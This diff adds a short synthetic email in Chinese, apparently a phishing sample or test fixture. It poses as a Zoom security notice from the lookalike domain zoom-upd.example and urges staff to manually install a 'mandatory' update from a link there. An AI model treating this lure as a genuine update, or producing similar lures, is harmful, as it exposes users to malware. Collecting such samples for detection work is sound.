@@ -1,0 +1,14 @@
+From: =?utf-8?B?Wm9vbSDpgJrnn6U=?= <notify@zoom-upd.example>
+To: staff@corp.internal
+Date: Fri, 11 Sep 2026 08:20:00 +0800
+Message-ID: <0010-b19@synth.example>
+Subject: Zoom 5.17 安全更新（手动安装）
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+您好：
+
+部分企业环境的 Zoom 客户端无法自动更新，本次为强制安全版本。
+手动安装包：https://zoom-upd.example/dl/5.17.2
+
+安装后无需重启。
